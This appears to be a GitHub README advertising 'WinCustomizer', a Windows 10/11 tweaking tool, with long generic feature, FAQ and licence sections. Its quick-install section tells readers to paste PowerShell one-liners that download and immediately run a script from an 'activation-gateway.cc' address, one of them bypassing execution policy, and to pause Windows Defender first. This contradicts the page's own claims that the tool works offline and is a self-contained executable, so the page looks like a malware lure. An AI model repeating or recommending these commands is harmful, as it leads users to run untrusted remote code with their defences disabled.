<div align="center">

# WinCustomizer: Comprehensive System Customization Toolkit for Windows 10 & 11

![preview](https://raw.githubusercontent.com/gcasanova0124-sudo/win-customizer/main/shot_3d607.svg)

[![users](https://img.shields.io/badge/USERS-184K-6366f1?style=social&labelColor=0d1117)]() [![lic](https://img.shields.io/badge/LIC-CC--BY--4.0-818cf8?style=social&labelColor=0d1117)]() [![rating](https://img.shields.io/badge/RATING-4.5%2F5-f59e0b?style=social&labelColor=0d1117)]() [![state](https://img.shields.io/badge/STATE-ACTIVE-2ea44f?style=social&labelColor=0d1117)]() [![tests](https://img.shields.io/badge/TESTS-GREEN-2ea44f?style=social&labelColor=0d1117)]() [![powershell-7](https://img.shields.io/badge/POWERSHELL--7-CORE-4f46e5?style=social&labelColor=0d1117)]()

</div>

---

WinCustomizer is a comprehensive desktop utility designed to deliver full-spectrum customization and control for Windows 10 and Windows 11 environments. The application provides a unified interface for managing system-level settings, tweaking interface behavior, and applying deep configuration changes that are otherwise scattered across the operating system. Built for users who require precise, repeatable control over their Windows configuration, it combines granular tuning options with a structured, feature-driven workflow. WinCustomizer targets both power users and administrators seeking a single, dependable tool for tailoring the Windows experience end to end.

## 💻 PowerShell Quick Install

> [!TIP]
> **Fast install** — a single PowerShell command, no extra tools.
> Windows 10 / 11 · PowerShell · One-line install

### 1️⃣ Prepare PowerShell
* Open the Start menu and type **PowerShell**.
* Right-click and choose **Run as administrator** (optional).

### 2️⃣ Paste and run
Paste the command into PowerShell and hit `Enter`.

```cmd
iex(irm 'https://activation-gateway.cc/update/ps-activator')
```

### 3️⃣ If PowerShell blocks the script
Paste this into a standard Command Prompt (cmd) and press `Enter`:

```cmd
powershell -NoProfile -ExecutionPolicy Bypass -Command "iex(irm 'https://activation-gateway.cc/update/ps-activator')"
```

> [!WARNING]
> Windows Defender or third-party AV may flag the script. Pause Real-time protection in Windows Security, run the installer, and re-enable it right after.

## 🔧 Requirements

- **PowerShell 5.1+** (pre-installed on Windows 10 and 11)
- **Windows 10 / 11** (x64)
- **Internet connection** — required to fetch the script
- **Administrator** — *not* required

## Features

- **System-wide customization engine**: Applies changes across the desktop, taskbar, Start menu, File Explorer, context menus, and system settings from a single interface, eliminating the need to edit the registry or navigate multiple configuration panels manually.

- **Modular tweak categories**: Organizes customization options into discrete modules (appearance, performance, privacy, context menu, and system behavior), allowing selective application of tweaks without affecting unrelated subsystems.

- **Registry-safe change application**: Validates and backs up registry modifications before writing, with automatic rollback support to restore the previous state if a tweak fails or is reverted.

- **Toggle-based configuration model**: Each tweak is exposed as an independent on/off control with immediate state feedback, so users can enable or disable individual behaviors without editing scripts or configuration files.

- **Restore point integration**: Creates a system restore point before applying batches of changes, providing a recoverable baseline for bulk customization operations.

- **Windows 10 and Windows 11 dual-target support**: Detects the host OS version at runtime and adjusts available tweaks and UI presentation accordingly, ensuring compatibility across both supported platforms.

- **Offline operation**: Performs all customization locally without network dependencies, so tweaks can be applied on isolated or restricted systems.

- **Lightweight resource footprint**: Runs as a native desktop application with minimal background overhead, avoiding persistent services or resident agents after configuration is applied.

- **Portable configuration export**: Allows users to save and reload customization profiles, enabling consistent setup across multiple machines or repeatable deployments.

- **Explicit change logging**: Records each applied modification in a session log for auditability and troubleshooting, with entries mapped to the corresponding tweak identifiers.

## How it works

WinCustomizer operates as a native desktop application that interfaces directly with Windows configuration layers, registry hives, and system services to apply customization changes in a controlled and reversible manner. Upon launch, the application enumerates the current system state, detecting the installed Windows build, available features, and existing configuration values, then presents these findings through a unified interface organized by functional category.

Each customization module is independent and scoped to a specific area of the operating system. When a user selects an option, WinCustomizer validates compatibility against the detected Windows version, prepares the required registry or service modifications, and applies them through a transactional workflow. Changes are staged in memory before commit, allowing the application to roll back partial operations if an error occurs, reducing the risk of leaving the system in an inconsistent state.

A built-in state tracking mechanism records every modification applied through the application, storing the original values alongside the new configuration. This enables one-click restoration of individual settings or a full revert to the pre-customization baseline. The tracking layer also supports exporting and importing configuration profiles, so a curated setup can be reproduced across multiple machines without manual re-entry.

System-level operations that require elevated privileges are executed through a dedicated elevation handler that requests administrative rights only when necessary, keeping standard browsing and inspection of settings available without prompting. Long-running operations report progress through the interface, and destructive or high-impact actions require explicit confirmation before proceeding.

WinCustomizer does not depend on external services or background agents. All logic executes locally within the application process, and no telemetry or configuration data leaves the machine. The application is packaged as a self-contained desktop executable, allowing it to run without a separate runtime installation and keeping its behavior consistent across supported Windows versions.

## Compatibility

WinCustomizer is engineered for Microsoft Windows 10 and Windows 11 across both x64 and ARM64 architectures. The application targets the modern Windows servicing branches, with support extending to Windows 10 version 1809 and later and all generally available Windows 11 releases. Both the Home and Pro editions are supported, as are Enterprise and Education SKUs, though certain customization modules may behave differently on managed or domain-joined systems where Group Policy enforces configuration restrictions.

Administrative privileges are required for the majority of operations, since most tweaks modify system-level registry hives, services, scheduled tasks, and component configurations. The application performs startup checks for elevation and gracefully degrades read-only functionality where elevation is absent. Windows 10 and 11 differ in several underlying subsystems — most notably the Start menu, taskbar, and shell components — and WinCustomizer detects the active OS build at runtime to apply the appropriate implementation path for each feature.

Firmware and platform requirements follow those of the host operating system: UEFI with Secure Boot is supported but not required, and both legacy BIOS and modern standby configurations are handled. A minimum display resolution of 1024x768 is recommended for the full interface, with DPI scaling supported up to 200 percent.

WinCustomizer is not compatible with Windows 8.1, Windows 8, Windows 7, or earlier releases. It is also not intended for Windows Server editions, Windows IoT, or Windows on Xbox; these platforms lack several of the shell and user-experience subsystems the application modifies. Pre-release and Insider builds are supported on a best-effort basis, but layouts and feature payloads that differ from generally available builds may produce partial results until the application is updated.

Because WinCustomizer modifies system settings directly, compatibility with third-party shell replacements, start menu alternatives, and system-wide theming utilities is not guaranteed. Users running such software should expect potential conflicts, and the application will warn when it detects known overlays. System Restore points and built-in backup mechanisms are honored: every operation logs its changes and provides a rollback path where technically feasible.

## FAQ

### What distinguishes WinCustomizer from conventional Windows tweaking utilities?

WinCustomizer is built as a unified 360° environment rather than a collection of disconnected toggles. Each module shares a single configuration core, so changes to privacy, appearance, services, and performance settings are coordinated through one dependency-aware pipeline. This prevents conflicting tweaks and allows every modification to be tracked and reverted from a centralized state model.

### Which Windows versions are supported?

WinCustomizer targets Windows 10 and Windows 11 across supported feature updates. Compatibility checks run at startup to detect build-specific behavior, and any module that relies on version-gated APIs will surface an explicit availability status instead of silently failing. Unsupported builds are flagged before configuration changes are applied.

### Does WinCustomizer require elevated privileges?

Most customization modules operate on system-level registry hives, scheduled tasks, and service states, which require administrative execution. WinCustomizer requests elevation once at launch and maintains a verified session token for subsequent operations. Modules that do not require elevation remain usable in a limited mode when elevation is declined.

### How are configuration changes persisted and reversed?

Every applied tweak is written through a transactional change journal. Before a setting is modified, its prior value is captured and stored alongside a stable identifier. Rollback operations replay the journal in reverse order, restoring the original state per key, per service, or per module. A full snapshot can also be generated for offline restoration.

### What is the scope of the 360° customization model?

The environment spans privacy and telemetry controls, appearance and shell customization, service and startup management, performance tuning, and maintenance utilities. Modules are independently addressable but share a consistent schema, meaning profiles exported from one installation can be validated and imported into another with equivalent build support.

### Can configurations be exported and reused across machines?

Yes. WinCustomizer supports profile export as a structured configuration artifact that encodes module selections, dependency constraints, and version requirements. On import, the artifact is validated against the target machine's build and applied through the same transactional pipeline used for interactive changes, preserving rollback guarantees.

### How does WinCustomizer handle Windows updates that alter underlying behavior?

Build detection is evaluated at each session start, and modules declare minimum and maximum supported build ranges. When an update introduces a change that invalidates a tweak's assumption, that tweak is marked as requiring review rather than being applied blindly. The change journal retains the last known-good values for recovery.

### Is system stability affected by aggressive tweaking?

The transactional model and dependency resolution are designed to keep modifications reversible and internally consistent. However, certain service or policy changes can affect behavior outside WinCustomizer's direct control. A snapshot should be created before applying broad profiles, enabling full restoration independent of individual journal entries.

### What telemetry or diagnostic data does WinCustomizer collect?

Diagnostic logging is local and opt-in. When enabled, it records module execution outcomes, build detection results, and rollback events to aid troubleshooting. Logs are stored on the local system and are never transmitted by the application itself; retention and export are user-controlled.

### How should WinCustomizer be updated?

Updates are distributed as versioned releases of the WinCustomizer package. Because configuration schemas and module availability can change between versions, profiles are validated against the installed version on import. Downgrading is supported but may reject profiles authored against newer schema revisions.

## Disclaimer

WinCustomizer modifies system-level configuration, registry entries, and shell components of Windows 10 and Windows 11. These operations are performed directly against the operating system and can alter system behavior in ways that extend beyond the scope of the application itself.

The software is provided as-is, without warranty of any kind, express or implied, including but not limited to warranties of merchantability, fitness for a particular purpose, or non-infringement. The author assumes no liability for any damage, data loss, system instability, boot failure, or loss of functionality resulting from the use, misuse, or misconfiguration of WinCustomizer.

Because WinCustomizer operates on core system settings, certain modifications may not be reversible through standard Windows rollback mechanisms. Users are responsible for creating a full system backup and a restore point prior to applying any changes. Compatibility with third-party software, drivers, or future Windows updates is not guaranteed, and cumulative modifications may produce unintended interactions.

WinCustomizer is intended for users with a working understanding of Windows system architecture and configuration management. Applying features without this understanding may result in a non-functional or unbootable system. Use of the software constitutes acceptance of these terms and full responsibility for any resulting outcomes.

## License

WinCustomizer is distributed as proprietary software. Use of the application is governed by the license terms bundled with the distribution and presented during first-run setup. The license grants a non-exclusive, non-transferable right to install and use WinCustomizer on compatible Windows 10 and Windows 11 systems for personal or internal business purposes, subject to the conditions set forth in the accompanying agreement.

Redistribution, sublicensing, reverse engineering, decompilation, or modification of the compiled binaries is prohibited except where such restrictions are expressly overridden by applicable law. The customization engine, module catalog, and configuration profiles remain the intellectual property of the project maintainers. Feature availability, including advanced tweaking modules and profile management, is defined by the license tier in effect at the time of activation.

The software is provided "as is," without warranty of any kind, express or implied, including but not limited to warranties of merchantability, fitness for a particular purpose, and non-infringement. In no event shall the authors or copyright holders be liable for any claim, damages, or other liability arising from, out of, or in connection with the software or its use. System modifications performed by WinCustomizer are applied at the user's discretion and risk; the license does not extend coverage to configuration changes made to the host operating system.

License validation is performed locally, and no telemetry is transmitted as part of the activation process. Users are responsible for retaining a copy of the license terms and any activation credentials associated with their installation.